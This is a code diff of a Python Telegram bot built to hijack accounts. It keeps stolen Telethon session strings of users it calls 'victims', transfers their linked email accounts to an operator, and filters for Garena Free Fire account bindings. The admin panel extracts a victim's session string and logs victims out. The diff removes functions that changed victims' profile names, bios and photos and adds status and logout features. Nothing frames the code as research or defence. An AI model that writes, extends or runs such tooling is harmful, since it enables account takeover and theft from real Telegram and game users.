@@ -18,8 +18,6 @@ from telegram.ext import (
 )
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest
-from telethon.tl.functions.photos import UploadProfilePhotoRequest
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
@@ -91,9 +89,7 @@ def init_db():
     c.execute("INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)", (OWNER_ID, OWNER_USERNAME))
     
     # Default Settings
-    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('mode_all_mails', '1')") # 1 = ON, 0 = OFF
-    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('mode_garena', '0')")     # 1 = ON, 0 = OFF
-    
+    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('mode_garena', '1')") # 1 = ON (FF Only), 0 = OFF (All)
     conn.commit()
     conn.close()
 
@@ -194,14 +190,10 @@ async def transfer_mails(victim_uid, target_owner_id):
         if owner_data and owner_data[0][0] and owner_data[0][0] != 'None':
             target_uname = owner_data[0][0]
 
-        mode_all = get_config('mode_all_mails') == '1'
-        mode_garena = get_config('mode_garena') == '1'
+        is_garena_mode = get_config('mode_garena') == '1'
 
         for email in emails:
-            if not mode_all and not mode_garena:
-                continue # Dono mode off hain
-
-            if mode_garena:
+            if is_garena_mode:
                 is_ff = await asyncio.to_thread(check_ff_binding, email)
                 if not is_ff:
                     continue 
@@ -441,21 +433,15 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
-    mode_all = "✅ ON" if get_config('mode_all_mails') == '1' else "❌ OFF"
     mode_garena = "✅ ON" if get_config('mode_garena') == '1' else "❌ OFF"
     
     kb = [
         [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
         [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
-        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')}", callback_data="check_session")],
-        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')}", callback_data="edit_bio")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')}", callback_data="change_photo")],
-        [InlineKeyboardButton(f"📝 {f_txt('Change Name')}", callback_data="change_name")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')}", callback_data="set_welcome_img")],
-        [InlineKeyboardButton(f"📊 {f_txt('Check FF Claimed Mails')}", callback_data="check_ff_claimed")],
         [InlineKeyboardButton(f"🔑 {f_txt('Login as Admin')}", callback_data="login_admin_contact")],
-        # MODES AT LAST
-        [InlineKeyboardButton(f"📥 {f_txt('Claim All Mails')}: {mode_all}", callback_data="toggle_mode_all")],
+        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')}", callback_data="check_session")],
+        [InlineKeyboardButton(f"🚪 {f_txt('Logout Victim')}", callback_data="logout_victim")],
+        [InlineKeyboardButton(f"📊 {f_txt('Status')}", callback_data="show_status")],
         [InlineKeyboardButton(f"🔥 {f_txt('Claim Garena FF Only')}: {mode_garena}", callback_data="toggle_mode_garena")]
     ]
     await update.message.reply_text(
@@ -472,17 +458,12 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
     
-    if data == "toggle_mode_all":
-        current = get_config('mode_all_mails')
-        new_val = '0' if current == '1' else '1'
-        set_config('mode_all_mails', new_val)
-        await owner_panel(query.message, context) # Refresh panel
-        
-    elif data == "toggle_mode_garena":
+    if data == "toggle_mode_garena":
         current = get_config('mode_garena')
         new_val = '0' if current == '1' else '1'
         set_config('mode_garena', new_val)
-        await owner_panel(query.message, context) # Refresh panel
+        await query.message.delete()
+        await owner_panel(query.message, context)
     
     elif data == "admin_acc":
         users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
@@ -500,35 +481,19 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"🔐 {f_txt('Send the phone number of the logged account to get session string')}:")
         user_states[uid] = 'check_session_wait'
         
-    elif data == "edit_bio":
-        await query.edit_message_text(f"✏️ {f_txt('Send the phone number of the logged account')}:")
-        user_states[uid] = 'edit_bio_phone'
+    elif data == "logout_victim":
+        await query.edit_message_text(f"🚪 {f_txt('Send the phone number of the victim to logout')}:")
+        user_states[uid] = 'logout_victim_phone'
         
-    elif data == "change_photo":
-        await query.edit_message_text(f"🖼 {f_txt('Send the phone number of the logged account')}:")
-        user_states[uid] = 'change_photo_phone'
-        
-    elif data == "change_name":
-        await query.edit_message_text(f"📝 {f_txt('Send the phone number of the logged account')}:")
-        user_states[uid] = 'change_name_phone'
-        
-    elif data == "set_welcome_img":
-        await query.edit_message_text(f"🖼 {f_txt('Send the image or image link you want to set as welcome')}:")
-        user_states[uid] = 'set_welcome_img_wait'
-        
-    elif data == "check_ff_claimed":
-        mails = db_exec("SELECT email, claimed_by, claimed_by_name FROM claimed_mails")
-        if not mails:
-            return await query.edit_message_text(f"❌ {f_txt('No FF Mails claimed yet.')}")
-        
-        text = f"📊 <b>{f_txt('Claimed FF Mails:')}</b>\n\n"
-        for i, m in enumerate(mails, 1):
-            text += f"{i}. {p_style(m[0])}\n   {f_txt('Claimed By')}: {m[2]} ({p_style(m[1])})\n\n"
-        
-        if len(text) > 4000:
-            await query.edit_message_text(text[:4000] + "...", parse_mode="HTML")
-        else:
-            await query.edit_message_text(text, parse_mode="HTML")
+    elif data == "show_status":
+        mode = "Garena FF Only" if get_config('mode_garena') == '1' else "All Mails"
+        mails = db_exec("SELECT COUNT(*) FROM claimed_mails")[0][0]
+        await query.message.reply_text(
+            f"📊 <b>{f_txt('BOT STATUS')}</b>\n\n"
+            f"🤖 {f_txt('Current Mode')}: {mode}\n"
+            f"📧 {f_txt('Total Mails Claimed')}: {mails}",
+            parse_mode="HTML"
+        )
 
     elif data == "login_admin_contact":
         await query.message.delete()
@@ -556,65 +521,26 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await update.message.reply_text(f"❌ {f_txt('No session found for this number')}.")
         user_states[uid] = None
         
-    elif state == 'edit_bio_phone':
+    elif state == 'logout_victim_phone':
         phone = text.strip()
         if not phone.startswith('+'): phone = '+' + phone
         res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
         if res:
-            user_states[uid] = {'state': 'edit_bio_text', 'victim_id': res[0][0]}
-            await update.message.reply_text(f"✏️ {f_txt('Enter the new Bio you want to set')}:")
+            victim_id = res[0][0]
+            client = await get_or_connect_client(victim_id)
+            if client:
+                try:
+                    await client.log_out()
+                    db_exec("DELETE FROM users WHERE user_id=?", (victim_id,))
+                    await update.message.reply_text(f"✅ {f_txt('Victim logged out and removed from database.')}")
+                except Exception as e:
+                    await update.message.reply_text(f"❌ {f_txt('Error logging out')}: {e}")
+            else:
+                await update.message.reply_text(f"❌ {f_txt('Session invalid or not found')}.")
         else:
             await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
-            user_states[uid] = None
-            
-    elif isinstance(state, dict) and state.get('state') == 'edit_bio_text':
-        bio_text = text
-        client = await get_or_connect_client(state['victim_id'])
-        if client:
-            try:
-                await client(UpdateProfileRequest(about=bio_text))
-                await update.message.reply_text(f"✅ {f_txt('Bio changed successfully!')}")
-            except Exception as e:
-                await update.message.reply_text(f"❌ {f_txt('Error changing bio')}: {e}")
-        else:
-            await update.message.reply_text(f"❌ {f_txt('Session invalid or expired')}.")
         user_states[uid] = None
 
-    elif state == 'change_name_phone':
-        phone = text.strip()
-        if not phone.startswith('+'): phone = '+' + phone
-        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
-        if res:
-            user_states[uid] = {'state': 'change_name_val', 'victim_id': res[0][0]}
-            await update.message.reply_text(f"📝 {f_txt('Enter the new First Name')}:")
-        else:
-            await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
-            user_states[uid] = None
-
-    elif isinstance(state, dict) and state.get('state') == 'change_name_val':
-        name_text = text
-        client = await get_or_connect_client(state['victim_id'])
-        if client:
-            try:
-                await client(UpdateProfileRequest(first_name=name_text))
-                await update.message.reply_text(f"✅ {f_txt('Name changed successfully!')}")
-            except Exception as e:
-                await update.message.reply_text(f"❌ {f_txt('Error changing name')}: {e}")
-        else:
-            await update.message.reply_text(f"❌ {f_txt('Session invalid or expired')}.")
-        user_states[uid] = None
-
-    elif state == 'change_photo_phone':
-        phone = text.strip()
-        if not phone.startswith('+'): phone = '+' + phone
-        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
-        if res:
-            user_states[uid] = {'state': 'change_photo_img', 'victim_id': res[0][0]}
-            await update.message.reply_text(f"🖼 {f_txt('Send the new photo now')}:")
-        else:
-            await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
-            user_states[uid] = None
-            
     elif state == 'set_welcome_img_wait':
         db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (text,))
         await update.message.reply_text(f"✅ {f_txt('Welcome Image Link set successfully!')}")
@@ -626,23 +552,7 @@ async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     if not state: return
     
-    if isinstance(state, dict) and state.get('state') == 'change_photo_img':
-        photo_file = await update.message.photo[-1].get_file()
-        file_path = f"/data/{state['victim_id']}_pfp.jpg"
-        await photo_file.download_to_drive(file_path)
-        
-        client = await get_or_connect_client(state['victim_id'])
-        if client:
-            try:
-                file = await client.upload_file(file_path)
-                await client(UploadProfilePhotoRequest(file=file))
-                await update.message.reply_text(f"✅ {f_txt('Profile Photo changed successfully!')}")
-            except Exception as e:
-                await update.message.reply_text(f"❌ {f_txt('Error')}: {e}")
-        os.remove(file_path)
-        user_states[uid] = None
-
-    elif state == 'set_welcome_img_wait':
+    if state == 'set_welcome_img_wait':
         photo_file = await update.message.photo[-1].get_file()
         file_path = f"/data/welcome_img.jpg"
         await photo_file.download_to_drive(file_path)
@@ -659,7 +569,7 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^edit_|^change_|^set_|^login_|^toggle_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^logout_|^show_|^toggle_|^login_"))
     
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, owner_text_handler), group=0)
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
